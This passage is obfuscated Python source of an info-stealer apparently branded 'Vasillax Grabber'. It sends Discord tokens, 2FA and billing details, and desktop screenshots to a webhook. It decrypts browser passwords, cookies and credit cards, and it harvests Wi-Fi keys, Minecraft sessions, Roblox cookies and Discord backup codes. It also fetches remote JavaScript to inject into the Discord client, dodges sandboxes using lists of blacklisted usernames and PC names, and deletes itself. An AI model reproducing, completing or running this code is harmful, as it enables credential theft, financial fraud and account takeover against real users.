            O0000OOOO0OO0O00O +=f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{OO0OO0OOO0O0OOO0O}` \n<:gmail:1051512749538164747> **Email:** `{O00OOO00OOO00OO00}`\n:mobile_phone: **Phone:** `{OO0O0OO0O000OO0OO}`\n\n🔐 **2FA:** {OOO0000O0O00000O0}\n<a:nitroboost:996004213354139658> **Nitro:** {O00OOO0OOOO00O0O0}\n<:billing:1051512716549951639> **Billing:** {OOOO00OOO0O0OO0OO}\n\n<:crown1:1051512697604284416> **Token:** `{O00OO0O00OO0OO0OO}`\n'#line:452
            O0O0OOO000O00OO0O ={"embeds":[{"title":f"{OO0000O0OOOOO0000}","color":5639644 ,"fields":[{"name":"Discord Info","value":O0000OOOO0OO0O00O }],"thumbnail":{"url":OOO0000OO000O0OO0 },"footer":{"text":"Vasillax Grabber | Created By Smug"},}],"username":"Vasillax","avatar_url":"https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",}#line:493
            requests .post (OOO00O0O0000O0O00 ,json =O0O0OOO000O00OO0O )#line:495
            O00OOOOOO0OOOOOOO .tokens_sent +=O00OO0O00OO0OO0OO #line:496
        O00OOOOOO0OOOOOOO .robloxinfo (OOO00O0O0000O0O00 )#line:498
        OO00O0O0O0OO0O00O =ImageGrab .grab (bbox =None ,all_screens =True ,include_layered_windows =False ,xdisplay =None )#line:505
        OO00O0O0O0OO0O00O .save (temp_path +"\\desktopshot.png")#line:506
        OO00O0O0O0OO0O00O .close ()#line:507
        OOOO000000000O0OO ={"username":"Vasillax","avatar_url":"https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096","embeds":[{"color":5639644 ,"title":"Desktop Screenshot","image":{"url":"attachment://image.png"}}]}#line:521
        with open (temp_path +"\\desktopshot.png","rb")as O00OOOO0OOOOOOO00 :#line:523
            O000O0000000OOOOO =O00OOOO0OOOOOOO00 .read ()#line:524
            OO0OOO000OO00OO0O =MultipartEncoder ({'payload_json':json .dumps (OOOO000000000O0OO ),'file':('image.png',O000O0000000OOOOO ,'image/png')})#line:525
        requests .post (OOO00O0O0000O0O00 ,headers ={'Content-type':OO0OOO000OO00OO0O .content_type },data =OO0OOO000OO00OO0O )#line:527
class Browsers :#line:530
    def __init__ (O0OO0O000O0O00OO0 ):#line:531
        O0OO0O000O0O00OO0 .appdata =os .getenv ('LOCALAPPDATA')#line:532
        O0OO0O000O0O00OO0 .roaming =os .getenv ('APPDATA')#line:533
        O0OO0O000O0O00OO0 .browser_exe =["chrome.exe","firefox.exe","brave.exe","opera.exe","kometa.exe","orbitum.exe","centbrowser.exe","7star.exe","sputnik.exe","vivaldi.exe","epicprivacybrowser.exe","msedge.exe","uran.exe","yandex.exe","iridium.exe"]#line:535
        O0OO0O000O0O00OO0 .browsers_found =[]#line:536
        O0OO0O000O0O00OO0 .browsers ={'kometa':O0OO0O000O0O00OO0 .appdata +'\\Kometa\\User Data','orbitum':O0OO0O000O0O00OO0 .appdata +'\\Orbitum\\User Data','cent-browser':O0OO0O000O0O00OO0 .appdata +'\\CentBrowser\\User Data','7star':O0OO0O000O0O00OO0 .appdata +'\\7Star\\7Star\\User Data','sputnik':O0OO0O000O0O00OO0 .appdata +'\\Sputnik\\Sputnik\\User Data','vivaldi':O0OO0O000O0O00OO0 .appdata +'\\Vivaldi\\User Data','google-chrome-sxs':O0OO0O000O0O00OO0 .appdata +'\\Google\\Chrome SxS\\User Data','google-chrome':O0OO0O000O0O00OO0 .appdata +'\\Google\\Chrome\\User Data','epic-privacy-browser':O0OO0O000O0O00OO0 .appdata +'\\Epic Privacy Browser\\User Data','microsoft-edge':O0OO0O000O0O00OO0 .appdata +'\\Microsoft\\Edge\\User Data','uran':O0OO0O000O0O00OO0 .appdata +'\\uCozMedia\\Uran\\User Data','yandex':O0OO0O000O0O00OO0 .appdata +'\\Yandex\\YandexBrowser\\User Data','brave':O0OO0O000O0O00OO0 .appdata +'\\BraveSoftware\\Brave-Browser\\User Data','iridium':O0OO0O000O0O00OO0 .appdata +'\\Iridium\\User Data','opera':O0OO0O000O0O00OO0 .roaming +'\\Opera Software\\Opera Stable','opera-gx':O0OO0O000O0O00OO0 .roaming +'\\Opera Software\\Opera GX Stable',}#line:554
        O0OO0O000O0O00OO0 .profiles =['Default','Profile 1','Profile 2','Profile 3','Profile 4','Profile 5',]#line:563
        for O0OO0OOOOOOO0OOO0 in psutil .process_iter (['name']):#line:565
            O00O000O00OOO0OOO =O0OO0OOOOOOO0OOO0 .info ['name'].lower ()#line:566
            if O00O000O00OOO0OOO in O0OO0O000O0O00OO0 .browser_exe :#line:567
                O0OO0O000O0O00OO0 .browsers_found .append (O0OO0OOOOOOO0OOO0 )#line:568
        for O0OO0OOOOOOO0OOO0 in O0OO0O000O0O00OO0 .browsers_found :#line:570
            O0OO0OOOOOOO0OOO0 .kill ()#line:571
        os .makedirs (os .path .join (temp_path ,"Browser"),exist_ok =True )#line:573
        def O0000O0O0O0OO0000 (O000000O0O00O00OO ,O0OOOO0O000O00O00 ,OOO0O00OOO0OO0OOO ,OOO0OO0OOOOOO0000 ):#line:575
            try :#line:576
                OOO0OO0OOOOOO0000 (O000000O0O00O00OO ,O0OOOO0O000O00O00 ,OOO0O00OOO0OO0OOO )#line:577
            except :#line:578
                pass #line:579
        OO00O0000O00000OO =[]#line:581
        for OOOO0O00OOO000O0O ,O0OOO000OO000OOOO in O0OO0O000O0O00OO0 .browsers .items ():#line:582
            if not os .path .isdir (O0OOO000OO000OOOO ):#line:583
                continue #line:584
            O0OO0O000O0O00OO0 .masterkey =O0OO0O000O0O00OO0 .get_master_key (O0OOO000OO000OOOO +'\\Local State')#line:586
            O0OO0O000O0O00OO0 .funcs =[O0OO0O000O0O00OO0 .cookies ,O0OO0O000O0O00OO0 .history ,O0OO0O000O0O00OO0 .passwords ,O0OO0O000O0O00OO0 .credit_cards ]#line:592
            for OOOO00OOO0OO0O00O in O0OO0O000O0O00OO0 .profiles :#line:594
                for O0O0O00O00O0000O0 in O0OO0O000O0O00OO0 .funcs :#line:595
                    O00OOOO000O0O0OOO =threading .Thread (target =O0000O0O0O0OO0000 ,args =(OOOO0O00OOO000O0O ,O0OOO000OO000OOOO ,OOOO00OOO0OO0O00O ,O0O0O00O00O0000O0 ))#line:596
                    O00OOOO000O0O0OOO .start ()#line:597
                    OO00O0000O00000OO .append (O00OOOO000O0O0OOO )#line:598
        for O00OOOO000O0O0OOO in OO00O0000O00000OO :#line:600
            O00OOOO000O0O0OOO .join ()#line:601
        O0OO0O000O0O00OO0 .roblox_cookies ()#line:603
    def get_master_key (OOOO00OOOO00OO0O0 ,O00O0O0O000000O0O :str )->str :#line:605
        try :#line:606
            with open (O00O0O0O000000O0O ,"r",encoding ="utf-8")as O000O00000O0OOOO0 :#line:607
                O0OO00OO00OOOOO0O =O000O00000O0OOOO0 .read ()#line:608
            OO00O0OOOOOO00OOO =json .loads (O0OO00OO00OOOOO0O )#line:609
            OO0OO0OO0O0OO000O =base64 .b64decode (OO00O0OOOOOO00OOO ["os_crypt"]["encrypted_key"])#line:610
            OO0OO0OO0O0OO000O =OO0OO0OO0O0OO000O [5 :]#line:611
            OO0OO0OO0O0OO000O =CryptUnprotectData (OO0OO0OO0O0OO000O ,None ,None ,None ,0 )[1 ]#line:612
            return OO0OO0OO0O0OO000O #line:613
        except :#line:614
            pass #line:615
    def decrypt_password (O0O00OO00O00OOO00 ,O0000OOO0000OOO00 :bytes ,O0000OO0000OOO00O :bytes )->str :#line:617
        OOO0O00O000O000O0 =O0000OOO0000OOO00 [3 :15 ]#line:618
        O0O00O0O0O00O000O =O0000OOO0000OOO00 [15 :]#line:619
        OO0000O00O00OOO00 =AES .new (O0000OO0000OOO00O ,AES .MODE_GCM ,OOO0O00O000O000O0 )#line:620
        OO00O0O0OO000O000 =OO0000O00O00OOO00 .decrypt (O0O00O0O0O00O000O )#line:621
        OO00O0O0OO000O000 =OO00O0O0OO000O000 [:-16 ].decode ()#line:622
        return OO00O0O0OO000O000 #line:623
    def passwords (OO0OOOO0O00O0O000 ,O0OO0OOOOO0OOO00O :str ,OOOOOO00000OOOOOO :str ,OOO0000O00000O00O :str ):#line:625
        if O0OO0OOOOO0OOO00O =='opera'or O0OO0OOOOO0OOO00O =='opera-gx':#line:626
            OOOOOO00000OOOOOO +='\\Login Data'#line:627
        else :#line:628
            OOOOOO00000OOOOOO +='\\'+OOO0000O00000O00O +'\\Login Data'#line:629
        if not os .path .isfile (OOOOOO00000OOOOOO ):#line:630
            return #line:631
        OO000O00OOOO0OO00 =sqlite3 .connect (OOOOOO00000OOOOOO )#line:632
        OO00000O000OOOO0O =OO000O00OOOO0OO00 .cursor ()#line:633
        OO00000O000OOOO0O .execute ('SELECT origin_url, username_value, password_value FROM logins')#line:634
        OO00OOO00000O0O00 =os .path .join (temp_path ,"Browser","passwords.txt")#line:635
        for O0OO0O000000O00OO in OO00000O000OOOO0O .fetchall ():#line:636
            if not O0OO0O000000O00OO [0 ]or not O0OO0O000000O00OO [1 ]or not O0OO0O000000O00OO [2 ]:#line:637
                continue #line:638
            O0O0O00OOO0O0O00O =O0OO0O000000O00OO [0 ]#line:639
            O00OOOO000000OOOO =O0OO0O000000O00OO [1 ]#line:640
            OO0OOO00O0O0000O0 =OO0OOOO0O00O0O000 .decrypt_password (O0OO0O000000O00OO [2 ],OO0OOOO0O00O0O000 .masterkey )#line:641
            with open (OO00OOO00000O0O00 ,"a",encoding ="utf-8")as O0O00OOO00O00O00O :#line:642
                if os .path .getsize (OO00OOO00000O0O00 )==0 :#line:643
                    O0O00OOO00O00O00O .write ("Website  |  Username  |  Password\n\n")#line:644
                O0O00OOO00O00O00O .write (f"{O0O0O00OOO0O0O00O}  |  {O00OOOO000000OOOO}  |  {OO0OOO00O0O0000O0}\n")#line:645
        OO00000O000OOOO0O .close ()#line:646
        OO000O00OOOO0OO00 .close ()#line:647
    def cookies (OO0OO00000O0O0O0O ,OO00O00O0OOOO0O00 :str ,OO0OOO00OOO0O0OOO :str ,OO0O00O0OO0000O0O :str ):#line:649
        if OO00O00O0OOOO0O00 =='opera'or OO00O00O0OOOO0O00 =='opera-gx':#line:650
            OO0OOO00OOO0O0OOO +='\\Network\\Cookies'#line:651
        else :#line:652
            OO0OOO00OOO0O0OOO +='\\'+OO0O00O0OO0000O0O +'\\Network\\Cookies'#line:653
        if not os .path .isfile (OO0OOO00OOO0O0OOO ):#line:654
            return #line:655
        OO0OO0O0O00OOOO0O =create_temp ()#line:656
        copy2 (OO0OOO00OOO0O0OOO ,OO0OO0O0O00OOOO0O )#line:657
        O00O0OOOO0O0OO0O0 =sqlite3 .connect (OO0OO0O0O00OOOO0O )#line:658
        O0OO00O0O000000OO =O00O0OOOO0O0OO0O0 .cursor ()#line:659
        with open (os .path .join (temp_path ,"Browser","cookies.txt"),'a',encoding ="utf-8")as O0O0OOOO0000OO00O :#line:660
            O0O0OOOO0000OO00O .write (f"\nBrowser: {OO00O00O0OOOO0O00}     Profile: {OO0O00O0OO0000O0O}\n\n")#line:661
            for OO00O00O0OO000O0O in O0OO00O0O000000OO .execute ("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall ():#line:662
                OO00O0OOO00O0OOO0 ,OO00O00O0OOOO0O00 ,OO0OOO00OOO0O0OOO ,O00O000OOO0000O00 ,OO0O00000OO00O000 =OO00O00O0OO000O0O #line:663
                O0O0OO00O000OOOO0 =OO0OO00000O0O0O0O .decrypt_password (O00O000OOO0000O00 ,OO0OO00000O0O0O0O .masterkey )#line:664
                if OO00O0OOO00O0OOO0 and OO00O00O0OOOO0O00 and O0O0OO00O000OOOO0 !="":#line:665
                    O0O0OOOO0000OO00O .write (f"{OO00O0OOO00O0OOO0}\t{'FALSE' if OO0O00000OO00O000 == 0 else 'TRUE'}\t{OO0OOO00OOO0O0OOO}\t{'FALSE' if OO00O0OOO00O0OOO0.startswith('.') else 'TRUE'}\t{OO0O00000OO00O000}\t{OO00O00O0OOOO0O00}\t{O0O0OO00O000OOOO0}\n")#line:666
        O0OO00O0O000000OO .close ()#line:667
        O00O0OOOO0O0OO0O0 .close ()#line:668
        os .remove (OO0OO0O0O00OOOO0O )#line:669
    def history (O0O00OO000O0OO0OO ,O0O00000OO0O0OOOO :str ,OO000000OO00O0O0O :str ,OOO0OOOO00OO000OO :str ):#line:671
        if O0O00000OO0O0OOOO =='opera'or O0O00000OO0O0OOOO =='opera-gx':#line:672
            OO000000OO00O0O0O +='\\History'#line:673
        else :#line:674
            OO000000OO00O0O0O +='\\'+OOO0OOOO00OO000OO +'\\History'#line:675
        if not os .path .isfile (OO000000OO00O0O0O ):#line:676
            return #line:677
        O0OO0O00O0O0O0OOO =sqlite3 .connect (OO000000OO00O0O0O )#line:678
        OOOOO000OO0OOO000 =O0OO0O00O0O0O0OOO .cursor ()#line:679
        O0O00O00O0OOO0O0O =os .path .join (temp_path ,"Browser","history.txt")#line:680
        with open (O0O00O00O0OOO0O0O ,'a',encoding ="utf-8")as OOO0OO0000OOOO0OO :#line:681
            if os .path .getsize (O0O00O00O0OOO0O0O )==0 :#line:682
                OOO0OO0000OOOO0OO .write ("Url  |  Visit Count\n\n")#line:683
            for OOOO0O0OO0OOO0O00 in OOOOO000OO0OOO000 .execute ("SELECT url, visit_count FROM urls").fetchall ():#line:684
                O0OO0OO0000O00OO0 ,O0OO00O00OO0OO0O0 =OOOO0O0OO0OOO0O00 #line:685
                OOO0OO0000OOOO0OO .write (f"{O0OO0OO0000O00OO0}  |  {O0OO00O00OO0OO0O0}\n")#line:686
        OOOOO000OO0OOO000 .close ()#line:687
        O0OO0O00O0O0O0OOO .close ()#line:688
    def credit_cards (OOO00OO0000O00000 ,O0O0OOOO000OO0OO0 :str ,OO00O0O0OOOOOO000 :str ,O0O0OO0O0OO0O0000 :str ):#line:690
        if O0O0OOOO000OO0OO0 in ['opera','opera-gx']:#line:691
            OO00O0O0OOOOOO000 +='\\Web Data'#line:692
        else :#line:693
            OO00O0O0OOOOOO000 +='\\'+O0O0OO0O0OO0O0000 +'\\Web Data'#line:694
        if not os .path .isfile (OO00O0O0OOOOOO000 ):#line:695
            return #line:696
        O0000O0O00O0OOOO0 =sqlite3 .connect (OO00O0O0OOOOOO000 )#line:697
        O0O00O00O0000OO00 =O0000O0O00O0OOOO0 .cursor ()#line:698
        O0O0OOO0O0000O0OO =os .path .join (temp_path ,"Browser","cc's.txt")#line:699
        with open (O0O0OOO0O0000O0OO ,'a',encoding ="utf-8")as OOO0OO0O0O0O00OOO :#line:700
            if os .path .getsize (O0O0OOO0O0000O0OO )==0 :#line:701
                OOO0OO0O0O0O00OOO .write ("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")#line:702
            for OOOOOO0OOOOO0OOO0 in O0O00O00O0000OO00 .execute ("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall ():#line:703
                OOOOOOO0O00OO00O0 ,O0OOOO0OO0O000OOO ,O00OOOOO0O0OO0OO0 ,OO0O0000O0OOO00O0 =OOOOOO0OOOOO0OOO0 #line:704
                OOOO000000OOO0O00 =OOO00OO0000O00000 .decrypt_password (OO0O0000O0OOO00O0 ,OOO00OO0000O00000 .masterkey )#line:705
                OOO0OO0O0O0O00OOO .write (f"{OOOOOOO0O00OO00O0}  |  {O0OOOO0OO0O000OOO}  |  {O00OOOOO0O0OO0OO0}  |  {OOOO000000OOO0O00}\n")#line:706
        O0O00O00O0000OO00 .close ()#line:707
        O0000O0O00O0OOOO0 .close ()#line:708
    def roblox_cookies (O000O00O00O000O0O ):#line:710
        O0000O00000OOOOOO =os .path .join (temp_path ,"Browser","roblox cookies.txt")#line:711
        if not __CONFIG__ ["roblox"]:#line:713
            pass #line:714
        else :#line:715
            O0000000O00OO0OO0 =""#line:716
            with open (os .path .join (temp_path ,"Browser","cookies.txt"),'r',encoding ="utf-8")as O0O000OOO0000O0O0 :#line:717
                with open (O0000O00000OOOOOO ,'w',encoding ="utf-8")as O00O0OOO0OOO0O00O :#line:718
                    for O00OOOOOOO00O0000 in O0O000OOO0000O0O0 :#line:719
                        if ".ROBLOSECURITY"in O00OOOOOOO00O0000 :#line:720
                            O0000000O00OO0OO0 =O00OOOOOOO00O0000 .split (".ROBLOSECURITY")[1 ].strip ()#line:721
                            O00O0OOO0OOO0O00O .write (O0000000O00OO0OO0 +"\n\n")#line:722
                    if os .path .getsize (O0000O00000OOOOOO )==0 :#line:723
                        O00O0OOO0OOO0O00O .write ("No Roblox Cookies Found")#line:724
class Wifi :#line:726
    def __init__ (OO00OO0OO0000O00O ):#line:727
        OO00OO0OO0000O00O .wifi_list =[]#line:728
        OO00OO0OO0000O00O .name_pass ={}#line:729
        OOOOOO0OO0O0OOO00 =subprocess .getoutput ('netsh wlan show profiles').split ('\n')#line:731
        for O0000OOO0000OOOO0 in OOOOOO0OO0O0OOO00 :#line:732
            if 'All User Profile'in O0000OOO0000OOOO0 :#line:733
                OO00OO0OO0000O00O .wifi_list .append (O0000OOO0000OOOO0 .split (":")[-1 ][1 :])#line:734
                OO00OO0OO0000O00O .wifi_info ()#line:735
    def wifi_info (O0O00O000OO0000O0 ):#line:737
        for OO0OOOOOO000O000O in O0O00O000OO0000O0 .wifi_list :#line:738
            O0O00O0O0OO000OOO =subprocess .getoutput (f'netsh wlan show profile "{OO0OOOOOO000O000O}" key=clear')#line:740
            if "Key Content"in O0O00O0O0OO000OOO :#line:741
                O0OO00O00O0OO0000 =O0O00O0O0OO000OOO .split ('Key Content')#line:742
                O0OO0O0000OO0OOO0 =O0OO00O00O0OO0000 [1 ].split ('\n')[0 ]#line:743
                O0O0O0OO000O0O0OO =O0OO0O0000OO0OOO0 .split (': ')[1 ]#line:744
                O0O00O000OO0000O0 .name_pass [OO0OOOOOO000O000O ]=O0O0O0OO000O0O0OO #line:745
            else :#line:746
                O0O0O0OO000O0O0OO =""#line:747
                O0O00O000OO0000O0 .name_pass [OO0OOOOOO000O000O ]=O0O0O0OO000O0O0OO #line:748
        os .makedirs (os .path .join (temp_path ,"Wifi"),exist_ok =True )#line:749
        with open (os .path .join (temp_path ,"Wifi","Wifi Passwords.txt"),'w',encoding ="utf-8")as OOOO00O0OO00OO00O :#line:750
            for OO0OOOOOO000O000O ,O0O0OO0OOO0O0O000 in O0O00O000OO0000O0 .name_pass .items ():#line:751
                OOOO00O0OO00OO00O .write (f'Wifi Name : {OO0OOOOOO000O000O} | Password : {O0O0OO0OOO0O0O000}\n')#line:752
        OOOO00O0OO00OO00O .close ()#line:753
class Minecraft :#line:756
    def __init__ (O00OOOOO000O0O00O ):#line:757
        O00OOOOO000O0O00O .roaming =os .getenv ("appdata")#line:758
        O00OOOOO000O0O00O .accounts_path ="\\.minecraft\\launcher_accounts.json"#line:759
        O00OOOOO000O0O00O .usercache_path ="\\.minecraft\\usercache.json"#line:760
        if os .path .exists (os .path .join (O00OOOOO000O0O00O .roaming ,".minecraft")):#line:762
            os .makedirs (os .path .join (temp_path ,"Minecraft"),exist_ok =True )#line:763
            try :#line:764
                O00OOOOO000O0O00O .session_info ()#line:765
                O00OOOOO000O0O00O .user_cache ()#line:766
            except Exception as O0O0OO0OOO0OO00OO :#line:767
                print (O0O0OO0OOO0OO00OO )#line:768
    def session_info (OOOOOOOO000OO0O0O ):#line:770
        with open (os .path .join (temp_path ,"Minecraft","Session Info.txt"),'w',encoding ="cp437")as OOOO000OOO000O00O :#line:771
            with open (OOOOOOOO000OO0O0O .roaming +OOOOOOOO000OO0O0O .accounts_path ,"r")as OO0OOOOO0O00O0O00 :#line:772
                OOOOOOOO000OO0O0O .session =json .load (OO0OOOOO0O00O0O00 )#line:773
                OOOO000OOO000O00O .write (json .dumps (OOOOOOOO000OO0O0O .session ,indent =4 ))#line:774
        OOOO000OOO000O00O .close ()#line:775
    def user_cache (OO0O00000000000O0 ):#line:777
        with open (os .path .join (temp_path ,"Minecraft","User Cache.txt"),'w',encoding ="cp437")as O00O0O00OOOO0OO00 :#line:778
            with open (OO0O00000000000O0 .roaming +OO0O00000000000O0 .usercache_path ,"r")as O0O0OOO00O00OO0O0 :#line:779
                OO0O00000000000O0 .user =json .load (O0O0OOO00O00OO0O0 )#line:780
                O00O0O00OOOO0OO00 .write (json .dumps (OO0O00000000000O0 .user ,indent =4 ))#line:781
        O00O0O00OOOO0OO00 .close ()#line:782
class BackupCodes :#line:785
    def __init__ (O0OOOOO00OOOO00O0 ):#line:786
        O0OOOOO00OOOO00O0 .path =os .environ ["HOMEPATH"]#line:787
        O0OOOOO00OOOO00O0 .code_path ='\\Downloads\\discord_backup_codes.txt'#line:788
        O0OOOOO00OOOO00O0 .get_codes ()#line:789
    def get_codes (O0000O0OOO0OO00O0 ):#line:791
        if os .path .exists (O0000O0OOO0OO00O0 .path +O0000O0OOO0OO00O0 .code_path ):#line:792
            os .makedirs (os .path .join (temp_path ,"Discord"),exist_ok =True )#line:793
            with open (os .path .join (temp_path ,"Discord","2FA Backup Codes.txt"),"w",encoding ="utf-8",errors ='ignore')as OO0O0O00OOOO0O0O0 :#line:794
                with open (O0000O0OOO0OO00O0 .path +O0000O0OOO0OO00O0 .code_path ,'r')as OOOO0O0OOOOO00000 :#line:795
                    for OO0O0OO00O000O0O0 in OOOO0O0OOOOO00000 .readlines ():#line:796
                        if OO0O0OO00O000O0O0 .startswith ("*"):#line:797
                            OO0O0O00OOOO0O0O0 .write (OO0O0OO00O000O0O0 )#line:798
            OO0O0O00OOOO0O0O0 .close ()#line:799
class AntiSpam :#line:802
    def __init__ (OO000000O0OOOOO00 ):#line:803
        if OO000000O0OOOOO00 .check_time ():#line:804
            sys .exit (0 )#line:805
    def check_time (OO000O0O0OO000OO0 )->bool :#line:807
        O00OO00000OOOOO00 =time .time ()#line:808
        try :#line:809
            with open (f"{temp}\\dd_setup.txt","r")as OO00OO00OO00O0O0O :#line:810
                OOO000OOO0O0O0O00 =OO00OO00OO00O0O0O .read ()#line:811
                if OOO000OOO0O0O0O00 !="":#line:812
                    OOOOO00O00O0O0O0O =float (OOO000OOO0O0O0O00 )#line:813
                    if O00OO00000OOOOO00 -OOOOO00O00O0O0O0O >60 :#line:814
                        with open (f"{temp}\\dd_setup.txt","w")as OO00OO00OO00O0O0O :#line:815
                            OO00OO00OO00O0O0O .write (str (O00OO00000OOOOO00 ))#line:816
                        return False #line:817
                    else :#line:818
                        return True #line:819
        except FileNotFoundError :#line:820
            with open (f"{temp}\\dd_setup.txt","w")as O0OO0OOOOO0O0OO0O :#line:821
                O0OO0OOOOO0O0OO0O .write (str (O00OO00000OOOOO00 ))#line:822
            return False #line:823
class SelfDestruct ():#line:826
    def __init__ (OOO000O00OOOOOO0O ):#line:827
        OOO000O00OOOOOO0O .path ,OOO000O00OOOOOO0O .frozen =OOO000O00OOOOOO0O .getfile ()#line:828
        OOO000O00OOOOOO0O .delete ()#line:829
    def getfile (O00OO0OO0O0OOOO0O ):#line:831
        if hasattr (sys ,'frozen'):#line:832
            return (sys .executable ,True )#line:833
        else :#line:834
            return (__file__ ,False )#line:835
    def delete (OO0OOO0OOOO0O000O ):#line:837
        if OO0OOO0OOOO0O000O .frozen :#line:838
            subprocess .Popen ('ping localhost -n 3 > NUL && del /F "{}"'.format (OO0OOO0OOOO0O000O .path ),shell =True ,creationflags =subprocess .CREATE_NEW_CONSOLE |subprocess .SW_HIDE )#line:839
            os ._exit (0 )#line:840
        else :#line:841
            os .remove (OO0OOO0OOOO0O000O .path )#line:842
class Injection :#line:845
    def __init__ (O0O000O000O0O00OO ,OOOO0O0O00O0OOOO0 :str )->None :#line:846
        O0O000O000O0O00OO .appdata =os .getenv ('LOCALAPPDATA')#line:847
        O0O000O000O0O00OO .discord_dirs =[O0O000O000O0O00OO .appdata +'\\Discord',O0O000O000O0O00OO .appdata +'\\DiscordCanary',O0O000O000O0O00OO .appdata +'\\DiscordPTB',O0O000O000O0O00OO .appdata +'\\DiscordDevelopment']#line:853
        O0O000O000O0O00OO .code =requests .get ('https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js').text #line:854
        for O00O00O00O000O0O0 in psutil .process_iter ():#line:856
            if 'discord'in O00O00O00O000O0O0 .name ().lower ():#line:857
                O00O00O00O000O0O0 .kill ()#line:858
        for O0OO0O0OO000O00O0 in O0O000O000O0O00OO .discord_dirs :#line:860
            if not os .path .exists (O0OO0O0OO000O00O0 ):#line:861
                continue #line:862
            if O0O000O000O0O00OO .get_core (O0OO0O0OO000O00O0 )is not None :#line:864
                with open (O0O000O000O0O00OO .get_core (O0OO0O0OO000O00O0 )[0 ]+'\\index.js','w',encoding ='utf-8')as OO0O0OOOO0OOO0O00 :#line:865
                    OO0O0OOOO0OOO0O00 .write ((O0O000O000O0O00OO .code ).replace ('discord_desktop_core-1',O0O000O000O0O00OO .get_core (O0OO0O0OO000O00O0 )[1 ]).replace ('%WEBHOOK%',OOOO0O0O00O0OOOO0 ))#line:866
                    O0O000O000O0O00OO .start_discord (O0OO0O0OO000O00O0 )#line:867
    def get_core (OOOO0000OOO00O0O0 ,O00O00OO00OOOOO0O :str )->tuple :#line:869
        for OO000O00000O000O0 in os .listdir (O00O00OO00OOOOO0O ):#line:870
            if re .search (r'app-+?',OO000O00000O000O0 ):#line:871
                O00OOOOO0OO0O00OO =O00O00OO00OOOOO0O +'\\'+OO000O00000O000O0 +'\\modules'#line:872
                if not os .path .exists (O00OOOOO0OO0O00OO ):#line:873
                    continue #line:874
                for OO000O00000O000O0 in os .listdir (O00OOOOO0OO0O00OO ):#line:875
                    if re .search (r'discord_desktop_core-+?',OO000O00000O000O0 ):#line:876
                        OO0000O00OO00OO0O =O00OOOOO0OO0O00OO +'\\'+OO000O00000O000O0 +'\\'+'discord_desktop_core'#line:877
                        if not os .path .exists (OO0000O00OO00OO0O +'\\index.js'):#line:878
                            continue #line:879
                        return OO0000O00OO00OO0O ,OO000O00000O000O0 #line:880
    def start_discord (O00O0O0OO0O0OOOO0 ,OO0O0O0OOO000O0OO :str )->None :#line:882
        OOO00000000OO0O0O =OO0O0O0OOO000O0OO +'\\Update.exe'#line:883
        O00000OO0OO0O0O0O =OO0O0O0OOO000O0OO .split ('\\')[-1 ]+'.exe'#line:884
        for OOO000OOOOO000O00 in os .listdir (OO0O0O0OOO000O0OO ):#line:886
            if re .search (r'app-+?',OOO000OOOOO000O00 ):#line:887
                O000OO00OOOOO0O0O =OO0O0O0OOO000O0OO +'\\'+OOO000OOOOO000O00 #line:888
                if os .path .exists (O000OO00OOOOO0O0O +'\\'+'modules'):#line:889
                    for OOO000OOOOO000O00 in os .listdir (O000OO00OOOOO0O0O ):#line:890
                        if OOO000OOOOO000O00 ==O00000OO0OO0O0O0O :#line:891
                            O00000OO0OO0O0O0O =O000OO00OOOOO0O0O +'\\'+O00000OO0OO0O0O0O #line:892
                            subprocess .call ([OOO00000000OO0O0O ,'--processStart',O00000OO0OO0O0O0O ],shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE )#line:894
class Debug :#line:897
    def __init__ (O000OO000OOOO0O00 ):#line:898
        if O000OO000OOOO0O00 .checks ():#line:899
            O000OO000OOOO0O00 .self_destruct ()#line:900
    def checks (OO00O0OOO00OOOOOO ):#line:902
        O0O0OO00OOO000OOO =False #line:903
        OO00O0OOO00OOOOOO .blackListedUsers =['WDAGUtilityAccount','Abby','hmarc','patex','RDhJ0CNFevzX','kEecfMwgj','Frank','8Nl0ColNQ5bq','Lisa','John','george','PxmdUOpVyx','8VizSM','w0fjuOVmCcP5A','lmVwjj9b','PqONjHVwexsS','3u2v9m8','Julia','HEUeRzl','fred','server','BvJChRPnsxn','Harry Johnson','SqgFOf3G','Lucas','mike','PateX','h7dk1xPr','Louise','User01','test','RGzcBUyrznReg']#line:908
        OO00O0OOO00OOOOOO .blackListedPCNames =['BEE7370C-8C0C-4','DESKTOP-NAKFFMT','WIN-5E07COS9ALR','B30F0242-1C6A-4','DESKTOP-VRSQLAG','Q9IATRKPRH','XC64ZB','DESKTOP-D019GDM','DESKTOP-WI8CLET','SERVER1','LISA-PC','JOHN-PC','DESKTOP-B0T93D6','DESKTOP-1PYKP29','DESKTOP-1Y2433R','WILEYPC','WORK','6C4E733F-C2D9-4','RALPHS-PC','DESKTOP-WG3MYJS','DESKTOP-7XC6GEZ','DESKTOP-5OV9S0O','QarZhrdBpj','ORELEEPC','ARCHIBALDPC','JULIA-PC','d1bnJkfVlH','NETTYPC','DESKTOP-BUGIO','DESKTOP-CBGPFEE','SERVER-PC','TIQIYLA9TW5M','DESKTOP-KALVINO','COMPNAME_4047','DESKTOP-19OLLTD','DESKTOP-DE369SE','EA8C2E2A-D017-4','AIDANPC','LUCAS-PC','MARCI-PC','ACEPC','MIKE-PC','DESKTOP-IAPKN1P','DESKTOP-NTU7VUO','LOUISE-PC','T00917','test42']#line:914
